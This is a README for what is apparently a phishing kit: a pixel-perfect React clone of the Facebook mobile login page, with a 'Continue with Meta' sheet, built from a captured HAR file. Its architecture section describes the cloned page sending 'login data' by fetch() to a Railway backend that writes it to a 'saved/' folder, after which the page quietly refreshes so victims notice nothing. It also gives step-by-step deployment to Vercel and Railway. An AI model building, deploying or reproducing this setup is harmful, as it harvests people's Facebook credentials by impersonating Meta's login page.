# Mobile Facebook (.har Extraction & React App)

This project extracts, organizes, and converts the HTTP Archive (`m.facebook.com.har`) of the Mobile Facebook page into an organized asset repository and a **100% pixel-perfect, working React application** with all styles, fonts, layouts, and assets completely frozen as-is.

---

## 📁 1. Extracted Files Organization (`/extracted`)

All 78 HTTP archive entries have been extracted into categorized folders, preserving original MIME types, binary encoding, and URL paths:

- **`extracted/html/`**: Main HTML documents and tracking frames (including `00_index_0.html` - the full server response).
- **`extracted/css/`**: 6 original Meta stylesheets containing Optimistic font-face declarations and base styles (`8LmiXDyZ1wv.css`, `CRc655ze0GZ.css`, `b8bT8K6wJb8.css`, `NdI56imvkTb.css`, `xNRLBTJ11-F.css`).
- **`extracted/fonts/`**: Original Meta variable WOFF2 fonts (`-pkMfchyeAZ.woff2`, `6YirsaXqsap.woff2`).
- **`extracted/images/`**: 26 extracted WebP, PNG, and GIF image assets:
  - `DUiOg0mJTjz.webp`: Iconic Facebook circular 'f' logo (60px)
  - `gLamC64FCJF.webp`: Download banner icon (blue mask)
  - `XpWPmzCEVDS.webp`: Input clear '✕' button
  - `WJI0PrMp5z2.webp`: Password show/hide eye toggle
  - `RkrEdst9VSp.webp`: Meta infinity logo lockup
  - Plus all bottom sheet service icons and pixels
- **`extracted/js/`**: 34 JavaScript modules from the HAR (WebBloks engine, BigPipe, metrics).
- **`extracted/data/`**: Manifests and telemetry payloads.
- **`extracted/manifest.json`**: Complete index of all 78 entries with sizes, hashes, and URLs.

---

## ⚛️ 2. The Working React Application

The application is built using **React** and **Vite**:

- **`src/App.jsx`**: The React component implementing 100% of the Facebook Mobile UI:
  - **Meta Family of Apps Bottom Sheet ("Continue with Meta")**: Automatically slides up from the bottom (matching HAR entry 41 `com.bloks.www.bloks.caa.login.continue_with_foa_bottom_sheet`), featuring:
    - Close drag handle (`36px × 4px`) & top-right `'✕'` button
    - Exact Family of Apps constellation illustration: Center blue Meta Infinity logo surrounded by floating badges for **Facebook**, **Instagram**, **Messenger**, and **Threads**
    - Headline: `"Already logged in on another Meta app?"`
    - Subtext: `"If you're logged in to Instagram, Messenger or Threads, you can use your Meta Account to continue to Facebook faster."`
    - Action buttons: Vibrant blue `"Continue"` button & `"Cancel"` button
    - Clicking `"Cancel"`, `'✕'`, or the dimmed background smoothly slides the sheet down, revealing the full login form underneath. Can be reopened at any time by clicking the Meta logo or `"More"` in the footer!
  - **Download App Banner**: Download arrow icon + `"Get Facebook for Android and browse faster."` + divider.
  - **Language Selector**: `"English (UK)"` with modal picker for multi-language selection.
  - **Facebook Logo**: Iconic circular blue badge (`/rsrc.php/yt/r/DUiOg0mJTjz.webp`).
  - **Email / Phone Input**: Rounded input with floating label animation and dynamic Clear (`✕`) button.
  - **Password Input**: Rounded input with floating label animation and dynamic Show/Hide eye (`👁`) toggle.
  - **Log In Button**: Full-width vibrant blue pill button (`#0064E0`) with hover and loading state.
  - **Forgotten Password Link**: Centered link (`15.2px`, weight 500).
  - **Create New Account Button**: Outline pill button with blue border (`#0064E0`).
  - **Meta Branding**: Meta infinity lockup logo (`/rsrc.php/ys/r/RkrEdst9VSp.webp`).
  - **Footer Links**: `"About"` • `"Help"` • `"More"`.
- **`src/facebook.css`**: 109 KB of completely frozen CSS combining all Optimistic fonts, reset rules, and all 142 dynamic `wbloks_` utility classes.
- **`public/rsrc.php/`**: Static assets organized to mirror Facebook CDN paths locally.

---

## 🚀 3. Architecture: Vercel (Frontend) + Railway (Backend)

This project uses two free hosting services:

- **Vercel**: Serves the static React build (`dist/`)
- **Railway**: Runs `server.js` and handles the `/api/save-backup` endpoint

### How it works

1. The React app (on Vercel) sends login data to the Railway server via `fetch()`
2. Railway's `server.js` receives the data and writes it to the `saved/` folder
3. The page refreshes naturally after saving (no loading toast)

---

## 🛠️ 4. Local Setup

### Development Server:
```bash
npm run dev
# or
npm start
```
Runs at `http://localhost:5173/`.

### Production Build:
```bash
npm run build
npm run preview
```
Production bundle is compiled into `dist/`.

---

## 🌐 5. Deploy to Vercel (Frontend)

1. Push your code to GitHub
2. Go to [vercel.com](https://vercel.com) and sign in
3. Click **Add New Project**
4. Import your GitHub repo (e.g., `https://github.com/Younis202/test.git`)
5. Vercel auto-detects Vite — keep defaults
6. Add environment variable: `VITE_API_URL` (see `.env.example`)
7. Click **Deploy**

Your app will be live at `https://your-project.vercel.app/`.

---

## 🚂 6. Deploy to Railway (Backend)

1. Push your code to GitHub
2. Go to [railway.app](https://railway.app) and sign in with GitHub
3. Click **New Project** → **Deploy from GitHub repo**
4. Select your repo
5. Railway auto-detects Node.js
6. Set the start command to: `node server.js`
7. Railway assigns a port automatically — `server.js` handles this with `process.env.PORT`
8. Copy the Railway URL (e.g., `https://your-app.up.railway.app`)

---

## 🔗 7. Connect Vercel to Railway

1. In the Vercel project, go to **Settings → Environment Variables**
2. Add:
   - **Key**: `VITE_API_URL`
   - **Value**: `https://your-app.up.railway.app/api/save-backup`
3. Redeploy

---

## 📸 8. Visual Verification

- **`react_facebook_screenshot.png`**: Headless Chrome screenshot of the pristine React app.
- **`react_facebook_filled.png`**: Headless Chrome screenshot showing interactive input states (floating labels, clear button, eye toggle, active focus outline).

---

## 📌 Notes

- The `saved/` folder is written to the machine running `server.js` (Railway)
- The React app on Vercel cannot write to `saved/` directly — it must go through the Railway API
- `.env` files are gitignored; use `.env.example` as a template
